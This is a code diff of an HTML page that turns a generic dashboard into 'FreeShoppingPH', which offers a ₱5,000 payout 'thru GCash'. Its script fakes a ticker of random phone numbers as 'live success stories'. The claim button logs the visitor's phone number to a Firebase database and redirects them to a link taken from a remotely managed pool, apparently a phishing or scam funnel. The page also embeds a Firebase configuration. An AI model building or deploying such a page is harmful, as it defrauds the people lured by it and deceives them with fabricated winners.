@@ -2,189 +2,213 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Main Dashboard - Welcome</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FreeShoppingPH | Official Assistance</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@700&display=swap" rel="stylesheet">
+    
     <style>
-        :root {
-            --primary-color: #007bff;
-            --secondary-color: #6c757d;
-            --success-color: #28a745;
-            --dark-bg: #121212;
-            --card-bg: #1e1e1e;
-            --text-light: #ffffff;
+        :root { 
+            --nature-green: #2d6a4f; 
+            --emerald: #40916c; 
+            --white-glass: rgba(255, 255, 255, 0.95); 
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body { 
+            font-family: 'Public Sans', sans-serif; 
+            background: linear-gradient(135deg, #e9f5f0 0%, #d8f3dc 100%); 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
         }
 
-        body {
-            background-color: var(--dark-bg);
-            color: var(--text-light);
-            overflow-x: hidden;
+        .card { 
+            background: var(--white-glass); 
+            width: 100%; 
+            max-width: 400px; 
+            padding: 25px; 
+            border-radius: 30px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            text-align: center; 
         }
 
-        /* --- Header Section --- */
-        header {
-            background: linear-gradient(135deg, #1e1e1e, #2c3e50);
-            padding: 20px;
-            text-align: center;
-            border-bottom: 2px solid var(--primary-color);
+        .logo-img { width: 100%; border-radius: 20px; margin-bottom: 15px; border: 2px solid #fff; }
+
+        h1 { font-size: 18px; color: var(--nature-green); margin-bottom: 5px; font-weight: 800; }
+
+        .amount { 
+            font-family: 'Quicksand', sans-serif; 
+            font-size: 42px; 
+            font-weight: 700; 
+            color: var(--nature-green); 
+            margin-bottom: 20px; 
         }
 
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: var(--primary-color);
+        .pay-button { 
+            background: linear-gradient(135deg, #52b788 0%, #2d6a4f 100%); 
+            color: white; 
+            width: 100%; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 15px; 
+            font-size: 16px; 
+            font-weight: 800; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            box-shadow: 0 8px 15px rgba(45, 106, 79, 0.3);
             text-transform: uppercase;
         }
 
-        /* --- Live Notification Marquee --- */
-        .live-ticker {
-            background: rgba(0, 123, 255, 0.1);
-            padding: 10px 0;
-            border-bottom: 1px solid #333;
+        .pay-button:active { transform: scale(0.96); }
+        .pay-button:disabled { background: #94a3b8; cursor: not-allowed; box-shadow: none; }
+
+        .promo-photo { width: 100%; border-radius: 20px; margin-top: 20px; border: 2px solid #fff; }
+
+        /* Winners Ticker & Animation */
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.8) translateY(10px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
         }
 
-        /* --- Main Content --- */
-        .container {
-            padding: 20px;
-            max-width: 800px;
-            margin: auto;
+        .winners-container { 
+            margin-top: 25px; 
+            background: #f8fdfb; 
+            padding: 15px; 
+            border-radius: 20px; 
+            border: 1px solid #e0f2ea; 
+            text-align: left; 
         }
 
-        .hero-banner {
-            width: 100%;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        .winner-item { 
+            background: white; 
+            padding: 10px 15px; 
+            border-radius: 12px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center;
+            margin-bottom: 8px; 
+            font-size: 13px; 
+            border: 1px solid #eee;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
 
-        .action-card {
-            background: var(--card-bg);
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-left: 5px solid var(--primary-color);
-            transition: transform 0.3s;
-        }
-
-        .action-card:hover {
-            transform: translateY(-5px);
-        }
-
-        /* --- Live Winners Section --- */
-        .live-updates {
-            background: #000;
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-        }
-
-        .update-item {
-            font-size: 0.9rem;
-            padding: 8px 0;
-            border-bottom: 1px solid #222;
-            display: flex;
-            justify-content: space-between;
-            color: #ccc;
-        }
-
-        .status-online {
-            color: var(--success-color);
-            font-weight: bold;
-        }
-
-        /* --- Buttons --- */
-        .btn-main {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            background: var(--primary-color);
-            color: white;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: bold;
-            margin-top: 15px;
-            font-size: 1.1rem;
-        }
-
-        footer {
-            text-align: center;
-            padding: 30px;
-            font-size: 0.8rem;
-            color: #555;
-        }
+        .gcash-icon { width: 18px; height: 18px; margin-right: 8px; vertical-align: middle; }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo"><i class="fas fa-shield-alt"></i> Portal Dashboard</div>
-    </header>
+<div class="card">
+    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_cover.jpg" class="logo-img">
+    
+    <h1>Available Assistance</h1>
+    <div class="amount">₱5,000.00</div>
 
-    <div class="live-ticker">
-        <marquee behavior="scroll" direction="left">
-            📢 Announcement: Welcome to the new dashboard! | 🟢 System Online | ⚡ High Speed Connection Enabled
-        </marquee>
+    <button class="pay-button" id="claimBtn" onclick="processClaim()">CLAIM THRU GCASH</button>
+
+    <img src="https://freeshoppingph.github.io/FreeShoppingPH/fs_pp.jpg" class="promo-photo">
+
+    <div class="winners-container">
+        <h3 style="font-size:11px; text-align:center; color:var(--emerald); margin-bottom:12px; letter-spacing: 1px;">🔴 LIVE SUCCESS STORIES</h3>
+        <div id="winners-list">
+            </div>
     </div>
+</div>
 
-    <div class="container">
-        <img src="https://via.placeholder.com/800x400/1e1e1e/ffffff?text=Main+Banner+Image" alt="Banner" class="hero-banner">
+<script>
+    // FIREBASE CONFIG
+    const firebaseConfig = {
+        apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
+        authDomain: "freeshoppingph-3bade.firebaseapp.com",
+        databaseURL: "https://freeshoppingph-3bade-default-rtdb.firebaseio.com",
+        projectId: "freeshoppingph-3bade",
+        storageBucket: "freeshoppingph-3bade.appspot.com",
+        messagingSenderId: "1028308831969",
+        appId: "1:1028308831969:web:96e224e75d69ba74332924"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-        <div class="action-card">
-            <h3><i class="fas fa-user-check"></i> Account Status</h3>
-            <p>Welcome back! Your session is active and secure.</p>
-            <a href="#" class="btn-main">PROCEED TO DASHBOARD</a>
-        </div>
+    // 1. DISPATCH LOGIC
+    async function processClaim() {
+        const btn = document.getElementById('claimBtn');
+        const userPhone = sessionStorage.getItem('user_phone') || "Unknown_User";
 
-        <div class="live-updates">
-            <h4 style="margin-bottom: 10px;"><i class="fas fa-bolt" style="color: yellow;"></i> Recent Activities</h4>
-            <div id="live-list">
-                </div>
-        </div>
+        btn.disabled = true;
+        btn.innerText = "VERIFYING SLOT...";
 
-        <div style="margin-top: 20px; display: flex; gap: 10px;">
-            <img src="https://via.placeholder.com/400x200/28a745/ffffff?text=Promotion+1" style="width: 50%; border-radius: 10px;">
-            <img src="https://via.placeholder.com/400x200/007bff/ffffff?text=Promotion+2" style="width: 50%; border-radius: 10px;">
-        </div>
-    </div>
-
-    <footer>
-        &copy; 2026 Web Services Philippines. All rights reserved.
-    </footer>
-
-    <script>
-        // Function to generate random "Live" data
-        function generateLiveUpdates() {
-            const list = document.getElementById('live-list');
-            const prefixes = ['0915', '0927', '0936', '0998', '0917', '0955'];
-            
-            setInterval(() => {
-                const randomNum = prefixes[Math.floor(Math.random() * prefixes.length)] + '****' + Math.floor(100 + Math.random() * 900);
-                const randomAmount = (Math.random() * 1000).toFixed(2);
-                
-                const div = document.createElement('div');
-                div.className = 'update-item';
-                div.innerHTML = `
-                    <span>User: ${randomNum}</span>
-                    <span class="status-online">+ ₱${randomAmount} Success</span>
-                `;
-                
-                list.prepend(div);
-                
-                if (list.children.length > 5) {
-                    list.removeChild(list.lastChild);
-                }
-            }, 3000); // New update every 3 seconds
+        // Check if Banned
+        const banSnap = await db.ref('banned_ghosts/' + userPhone).once('value');
+        if (banSnap.exists()) {
+            alert("Security Alert: Your access has been restricted.");
+            btn.innerText = "ACCESS DENIED";
+            return;
         }
 
-        window.onload = generateLiveUpdates;
-    </script>
+        // Find available link
+        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value')
+        .then((snapshot) => {
+            if (snapshot.exists()) {
+                let linkId, linkData;
+                snapshot.forEach(c => { 
+                    linkId = c.key; 
+                    linkData = c.val(); 
+                });
+
+                // Update Database
+                db.ref('links/' + linkId).update({
+                    status: 'in-use',
+                    claimedBy: userPhone,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                }).then(() => {
+                    btn.innerText = "REDIRECTING...";
+                    setTimeout(() => { 
+                        window.location.href = linkData.url; 
+                    }, 800);
+                });
+            } else {
+                alert("SORRY: No available GCash slots right now. Please try again later.");
+                btn.disabled = false;
+                btn.innerText = "CLAIM THRU GCASH";
+            }
+        });
+    }
+
+    // 2. LIVE SUCCESS STORIES LOGIC
+    const prefixes = ['0917', '0915', '0927', '0935', '0945', '0995', '0966'];
+    
+    function addWinner() {
+        const list = document.getElementById('winners-list');
+        const item = document.createElement('div');
+        item.className = 'winner-item';
+        
+        const randomPhone = `${prefixes[Math.floor(Math.random()*prefixes.length)]}***${Math.floor(1000+Math.random()*9000)}`;
+        
+        item.innerHTML = `
+            <div>
+                <img src="https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png" class="gcash-icon">
+                <span style="font-weight:600;">${randomPhone}</span>
+            </div>
+            <span style="color:#2d6a4f; font-weight:800;">+₱5,000</span>
+        `;
+        
+        list.prepend(item);
+        if (list.children.length > 5) {
+            list.removeChild(list.lastChild);
+        }
+    }
+
+    // Start Ticker
+    setInterval(addWinner, 4000);
+    addWinner(); // Initial one
+</script>
+
 </body>
 </html>
